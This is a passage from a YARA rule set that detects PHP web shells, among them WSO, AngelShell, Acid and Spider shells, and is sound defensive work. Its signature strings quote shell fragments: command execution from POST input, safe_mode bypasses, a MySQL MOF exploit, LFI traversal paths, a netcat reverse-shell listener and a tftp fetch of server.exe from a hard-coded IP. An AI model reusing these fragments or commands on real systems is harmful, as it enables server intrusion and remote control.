      $s15 = "echo \"<font size=2 color=#888888><b>Disable Functions : \";" fullword ascii
      $s16 = "echo '<form enctype=\"multipart/form-data\" action method=POST><font size=2 color=#888888><b>Upload File</b></font><br><input ty" ascii
      $s17 = "<?php @ini_restore(\"disable_functions\");" fullword ascii
      $s18 = "} elseif ($u = strrpos($cwd, '\\')){" fullword ascii
      $s19 = "$security = \"SAFE_MODE : OFF\";" fullword ascii
      $s20 = "if (isset($_GET['baca'])) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 9KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_35940353c0f3d6511e2789fc3cb9e5b3cea3b10d_5bcb3adc55b62f4e43f154b29d31cced0cbd32a5__252
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash3 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash4 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash5 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash6 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash7 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash8 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash9 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash10 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $x1 = "ox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"))));" fullword ascii
      $s2 = "ver']):(\"localhost\"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):(\"3306\"))));" fullword ascii
      $s3 = "]):(\"mysql\"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"))));" fullword ascii
      $s4 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s5 = "$extra = \"-C \".$_POST['test5_file'].\" -X /tmp/mb_send_mail\";" fullword ascii
      $s6 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii
      $s7 = "'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body'," fullword ascii
      $s8 = "'eng_text112'=>'Test bypass safe_mode with function mb_send_mail'," fullword ascii
      $s9 = "'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list'," fullword ascii
      $s10 = "echo sr(35,\"<b>\".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow.\"</b>\",in('text','mysql_l',15,(!empty($_" ascii
      $s11 = "if (@file_exists('/tmp/mb_send_mail')) @unlink('/tmp/mb_send_mail');" fullword ascii
      $s12 = "\"password\"))));" fullword ascii
      $s13 = "for ($i = 0; $i < count($dir_list); $i++) echo $dir_list[$i].\"\\r\\n\";" fullword ascii
      $s14 = "echo sr(35,\"<b>\".$lang[$language.'_text111'].$arrow.\"</b>\",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db" ascii
      $s15 = "foreach ($lines as $line) { echo htmlspecialchars($line).\"\\r\\n\"; }" fullword ascii
      $s16 = "echo sr(35,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql" ascii
      $s17 = "['mysql_l'])?($_POST['mysql_l']):(\"root\"))).' <b>:</b> '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p'])" ascii
      $s18 = "$lines = file ('/tmp/mb_send_mail');" fullword ascii
      $s19 = "if($safe_mode&&$unix&&function_exists('mb_send_mail')){" fullword ascii
      $s20 = "echo sr(35,\"<b>\".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow.\"</b>\",in('text','mysql_l',15,(!empty($_" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _043c3d7e489c69b48737cc0c92d0f3a2_091f4d33fe8f9ccfc76a0976a54396ad_0e634bcc16b562c9a8365ef42b37be8a0eabfd73_2009mssql_2011_2_253
{
   meta:
      description = "php17 - from files 043c3d7e489c69b48737cc0c92d0f3a2.php, 091f4d33fe8f9ccfc76a0976a54396ad.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2009mssql.php, 2011.php, 2011__2_.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, 8cb920e907d03c01ede32ca82469f2ec6b551746.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash2 = "05704ad19226b29711324aaa819d18711c916acb17f9158e3616ad505cb844a6"
      hash3 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash4 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash5 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash6 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash7 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash8 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash9 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash10 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash11 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash12 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $s1 = "$attachsize = '<a href=\"javascript:getsize(\\''.$dirdb['server_link'].'\\',\\''.$dir.'\\');\">Stat</a>';" fullword ascii
      $s2 = "makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));" fullword ascii
      $s3 = "formhead(array('name'=>'fileopform', 'target'=>'_blank'));" fullword ascii
      $s4 = "header(\"content-Type: text/html; charset=euc-kr\");" fullword ascii
      $s5 = "header(\"content-Type: text/html; charset=euc-jp\");" fullword ascii
      $s6 = "p(' | View Writable ( <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'dir\\');\">Directory</a>');" fullword ascii
      $s7 = "if ($_COOKIE['loginpass']) {" fullword ascii
      $s8 = "p(' | <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'file\\');\">File</a> )');" fullword ascii
      $s9 = "$fileurl = str_replace($_SERVER[\"DOCUMENT_ROOT\"],'',$filedb['server_link']);" fullword ascii
      $s10 = "$('getsize').dir.value=dir;" fullword ascii
      $s11 = "if($getdir && $getdir == $dirdb['server_link']) {" fullword ascii
      $s12 = "$dirdata = GetWDirList($nowpath);" fullword ascii
      $s13 = "$filedata = GetWFileList($nowpath);" fullword ascii
      $s14 = "$('getsize').getdir.value=getdir;" fullword ascii
      $s15 = "formhead(array('name'=>'getsize'));" fullword ascii
      $s16 = "function getsize(getdir,dir){" fullword ascii
      $s17 = "makehide('getdir');" fullword ascii
      $s18 = "$('getsize').submit();" fullword ascii
      $s19 = "p('<tr class=\"alt1\"><td colspan=\"7\" style=\"padding:5px;line-height:20px;\">');" fullword ascii
      $s20 = "$attachsize = dirsize($dirdb['server_link']);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab8695666_254
{
   meta:
      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 27.9.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash3 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash4 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash5 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash6 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash7 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash8 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash9 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash10 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash11 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash12 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash13 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash14 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash15 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash16 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash17 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
      hash18 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash19 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash20 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash21 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash22 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
      hash23 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash24 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash25 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
   strings:
      $s1 = "$acts = array(\"\",\"newdb\",\"serverstatus\",\"servervars\",\"processes\",\"getfile\");" fullword ascii
      $s2 = "$query = \"SELECT * FROM `\".$sql_tbl.\"` \".$v.\"LIMIT \".$sql_tbl_ls.\" , \".$perpage.\"\";" fullword ascii
      $s3 = "global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;" fullword ascii
      $s4 = "if (!$mode) {echo \"<b>Change file-mode with error:</b> can't get current value.\";}" fullword ascii
      $s5 = "else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}" fullword ascii
      $s6 = "$perpage = $sql_tbl_le - $sql_tbl_ls;" fullword ascii
      $s7 = "if ($sql_tbl_act == \"structure\") {echo \"<br><br><b>Coming sooon!</b>\";}" fullword ascii
      $s8 = "$cmdline .= \" \".$actarcbuff_path;" fullword ascii
      $s9 = "if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo \"</u></a>\";}" fullword ascii
      $s10 = "elseif ($sql_act == \"tbldump\") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $" ascii
      $s11 = "if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}" fullword ascii
      $s12 = "define(\"starttime\",getmicrotime());" fullword ascii
      $s13 = "if ($sql_act == \"getfile\")" fullword ascii
      $s14 = "else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}" fullword ascii
      $s15 = "if (empty($sql_tbl_act)) {$sql_tbl_act = \"browse\";}" fullword ascii
      $s16 = "if (!fs_move_obj($v,$to)) {$psterr .= \"Can't move \".$v.\" to \".$to.\"!<br>\";}" fullword ascii
      $s17 = "if (!fs_copy_obj($v,$to)) {$psterr .= \"Can't copy \".$v.\" to \".$to.\"!<br>\";}" fullword ascii
      $s18 = "if (!is_numeric($perpage)) {$perpage = 10;}" fullword ascii
      $s19 = "echo \"<b>\".view_perms_color($d).\"</b>\";" fullword ascii
      $s20 = "if (empty($nl2br)) {$nl2br = 0;}" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6544 or uint16(0) == 0x733c or uint16(0) == 0x2a2f or uint16(0) == 0xbbef ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _1c17c415d4ca6993d94399a3f37e81d46e2398e8_2f44931fb2c95507fd00bda39b20917c7ddc2ee9_255
{
   meta:
      description = "php17 - from files 1c17c415d4ca6993d94399a3f37e81d46e2398e8.php, 2f44931fb2c95507fd00bda39b20917c7ddc2ee9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "68083b121236aa54a80ff8a69b3325aa8c2b3fe4039b67197e6cc61411dd1a67"
      hash2 = "9b7c948fb2be2e385e2f0cd6f91a134d54c0fb6df3a332e72c37a308fd40e1e2"
   strings:
      $s1 = "echo \"<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try read" fullword ascii
      $s2 = "$sql1=\"select '$payload' into dumpfile '$mofname';\";" fullword ascii
      $s3 = "$cmdshell='cmd /c '.$strCmd.'>'.$path;" fullword ascii
      $s4 = "$mofname=\"c:/windows/system32/wbem/mof/system.mof\";" fullword ascii
      $s5 = "echo \"<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try read " ascii
      $s6 = "if (isset($_POST['cmd'])){" fullword ascii
      $s7 = "$strCmd=$_POST['cmd'];" fullword ascii
      $s8 = "$conn=mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"user\"],$_COOKIE[\"connect\"][\"pass\"])  or die('<p" ascii
      $s9 = "echo \"<form action='' method='post'>\";" fullword ascii
      $s10 = "mysql_select_db($_COOKIE[\"connect\"][\"dbname\"],$conn);" fullword ascii
      $s11 = "echo \"<input type='submit' value='Exploit'>\";" fullword ascii
      $s12 = "again later<br><hr>\"; else die(mysql_error());" fullword ascii
      $s13 = "$conn=mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"user\"],$_COOKIE[\"connect\"][\"pass\"])  or die('<p" ascii
      $s14 = "echo \"<input type='submit'value=' Read  '>\";" fullword ascii
      $s15 = "if(isset($_POST['flag']))" fullword ascii
      $s16 = "echo \"<input type='hidden' name='flag' value='flag'>\";" fullword ascii
      $s17 = "while ($row = mysql_fetch_array($result2, MYSQL_NUM)) {" fullword ascii
      $s18 = "$sql2=\"select load_file(\\\"\".$path.\"\\\");\";" fullword ascii
      $s19 = "_error().'</pre>');" fullword ascii
      $s20 = "ScriptText =" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 8KB and ( 8 of them )
      ) or ( all of them )
}

rule _04048aeca2c0f5d84639358008ed2ae7_07908a44d5a13497cbc0b1bebc2711af30699b5f_1b836517164c18caf2c92ee2a06c645e26936a0c_52a24d47_256
{
   meta:
      description = "php17 - from files 04048aeca2c0f5d84639358008ed2ae7.php, 07908a44d5a13497cbc0b1bebc2711af30699b5f.php, 1b836517164c18caf2c92ee2a06c645e26936a0c.php, 52a24d47b2ef5b2e6b3fbc1256cd665b285cdfcb.php, 707c3581b213fb880e287d1f5338011c391c191b.php, 85892669184e1d2cbe29ceccc563adda.php, 992a2bc4b1e8a8ffd1f764fdd16b145167df1e98.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9b6d2f6aa7a0b96f945d64587d3d427764945cb9052f6eb70f935bc1e7546baf"
      hash2 = "7681d56cf9de3c807db7bd6a60b93b335bc7a0ba048dd32df6b4f81073c4c372"
      hash3 = "de4560335dc3fca28c6be33d682d36b9fbdf013b72c62e6836cceee9e96b0da1"
      hash4 = "e63f87c1811cfc8727bf6e2a3e8735110105c8b7dbe8475866d0edbca5ec2843"
      hash5 = "83b29f8bf786c061de47f592bdb7a78ce1f747b44cb5718700e2c9d65f3641b3"
      hash6 = "c4f21ed037126fc1f6e18feafc260c20c078f287b12e06cdfa6873271263fd33"
      hash7 = "5c764951c465e586adc1e53821ab20c0bcc3f542dcc720bbc6609dd75c33c528"
   strings:
      $s1 = "<input name='action' value='download' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s2 = "<input name='action' value='cmd' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s3 = "$dump_file=\"#ZaCo MySQL Dumper\\n#db $db from $host\\n\";" fullword ascii
      $s4 = "<input name='action' value='upload' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s5 = "<input name='cmd' type=text size=120 value='<?=str_replace('\\'','&#039;',$cmd)?>'>" fullword ascii
      $s6 = "<form method=post enctype=\"multipart/form-data\">" fullword ascii
      $s7 = ".basename(__FILE__).'?eval\\'>eval</a>###</center>'.($winda===false?'id :'.`id`:'');" fullword ascii
      $s8 = "<form method='post' name='main_form'>" fullword ascii
      $s9 = "<body link=palegreen vlink=palegreen text=palegreen bgcolor=#2B2F34>" fullword ascii
      $s10 = "<tr><td>User :<input name='user' type=text value='<?=$user?>'></td><td>Passwd :<input name='passwd' type=text value='<?=$passwd?" ascii
      $s11 = "<input name='work_dir' value='<?=$e_work_dir?>' type=text size=120>" fullword ascii
      $s12 = "echo($head.$pages);" fullword ascii
      $s13 = "<input name='action' value='eval_in_html' type='submit'>" fullword ascii
      $s14 = "<input name='action' value='eval' type='submit'>" fullword ascii
      $s15 = "<input name='fname' type=text size=120><br>" fullword ascii
      $s16 = "<input name='page' value='eval' type=hidden>" fullword ascii
      $s17 = "$pages='<center>###<a href=\\''.basename(__FILE__).'\\'>cmd</a>###<a href=\\''.basename(__FILE__).'?mysql\\'>mysql</a>###<a href" ascii
      $s18 = "$pages='<center>###<a href=\\''.basename(__FILE__).'\\'>cmd</a>###<a href=\\''.basename(__FILE__).'?mysql\\'>mysql</a>###<a href" ascii
      $s19 = ">'></td><td>Host :<input name='host' type=text value='<?=$host?>'></td><td>DB :<input name='db' type=text value='<?=$db?>'></td>" ascii
      $s20 = "<input name='work_dir'type=hidden>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 50KB and ( 8 of them )
      ) or ( all of them )
}

rule _06521d9b70a37cb6455a9684ef3db13944feca2e_404__2__404_php_no_99a549eaba203e1a4f972811cc417f693ab4be4c_257
{
   meta:
      description = "php17 - from files 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 404 (2).php, 404.php.no.php, 99a549eaba203e1a4f972811cc417f693ab4be4c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash2 = "8d5918b308273d96c1a511c6c7905a8ce1513c61fa88939cbd1c43b774e17950"
      hash3 = "fb11c438682498254ede5200573674ff180ae888b92aee9996db7800fa55b4c4"
      hash4 = "e16ceb2d3015fbe3fa042c6b021e91fa6fd118bd3e64fe28f78b84c13a9648e1"
   strings:
      $x1 = "/* WSO 2.6 (404 Error Web Shell by Madleets.com) */" fullword ascii
      $x2 = "print \"<font color='green'>[+] Exploitable!</font> <a href=\\\"\".$target.\"\".$lfitest.\"\\\">\".$target.\"\".$lfitest.\"</" fullword ascii
      $s3 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfierror[$x].\"\\\">\".$target.\"\".$lfie" fullword ascii
      $s4 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lficonfig[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s5 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfimysql[$x].\"\\\">\".$target.\"\".$lfim" fullword ascii
      $s6 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfiphpini[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s7 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfiftp[$x].\"\\\">\".$target.\"\".$lfiftp" fullword ascii
      $s8 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfiprocenv.\"\\\">\".$target.\"\".$lfipro" fullword ascii
      $s9 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfiaccess[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s10 = "echo \"file name: <input type=text name=p2 value='wso_\" . date(\"Ymd_His\") . \".\" . ($_SESSION['act'] == 'zip'?'zip':'tar.g" fullword ascii
      $s11 = "$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','t" fullword ascii
      $s12 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' </nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid " fullword ascii
      $s13 = "<td><input type=text name=sql_login value='\". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) .\"'></" ascii
      $s14 = "28 => \"../../../../../../../../../../../../../../../Volumes/webBackup/private/etc/httpd/httpd.conf.default\".$byte1.\"" fullword ascii
      $s15 = "$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate'" fullword ascii
      $s16 = "$sql = 'INSERT INTO `'.$table.'` ('.implode(\", \", $columns).\") VALUES \\n\\t(\".implode(\", \", $item).')" fullword ascii
      $s17 = "<td><input type=text name=sql_host value='\". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) .\"'>" ascii
      $s18 = "<td><input type=text name=sql_pass value='\". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) .\"'></td><td>" ascii
      $s19 = "/*Maded by DrSpy*/" fullword ascii
      $s20 = "<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 " ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_5bdae9780fa349f3b58c475985c13c012897bd61_7e594b9fa652d185c4b87ab7080f740f5d7_258
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, 9735037eae2f73171d007caca31fbfb6467850d5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash4 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash5 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x3 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x4 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x5 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x6 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x7 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $s8 = "<input type=\"text\" name=\"tca\" id=\"tca\" value=\".exe|.z0|.rar|.zip|.gz|.torrent\" style=\"width:500px;\"><br><br>" fullword ascii
      $s9 = "<textarea name=\"gc\" id=\"gc\" style=\"width:610px;height:180px;\">&lt;script language=javascript src=\"http://www.baidu.com/ad" ascii
      $s10 = "<textarea name=\"gc\" id=\"gc\" style=\"width:610px;height:180px;\">&lt;script language=javascript src=\"http://www.baidu.com/ad" ascii
      $s11 = "echo File_Write('/tmp/spider_bc.c',base64_decode($back_connect_c),'wb') ? '" fullword ascii
      $s12 = "echo File_Write('/tmp/spider_bc',base64_decode($back_connect_pl),'wb') ? '" fullword ascii
      $s13 = "<input type=\"text\" name=\"qt\" id=\"qt\" value=\".htm|.html|.shtml\" style=\"width:500px;\">" fullword ascii
      $s14 = "<input type=\"text\" name=\"gt\" id=\"gt\" value=\".htm|.html|.shtml\" style=\"width:500px;\">" fullword ascii
      $s15 = "<title> Spider PHP Shell (SPS-3.0) </title>" fullword ascii
      $s16 = "Str[7] = \"INSERT INTO [TableName](USER,PASS) VALUES('spider','mypass')\";" fullword ascii
      $s17 = "Str[9] = \"UPDATE [TableName] SET USER='spider' WHERE ID=100\";" fullword ascii
      $s18 = "9'=>'<%@ LANGUAGE = VBScript.Encode %>','aspx" fullword ascii
      $s19 = "6-]\"&gt;&lt;/script&gt;</textarea>" fullword ascii
      $s20 = "/tmp/spider_bc.c" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab86956663e1819cd_0771fc6f0f4b1d7d1bb73bbb_259
{
   meta:
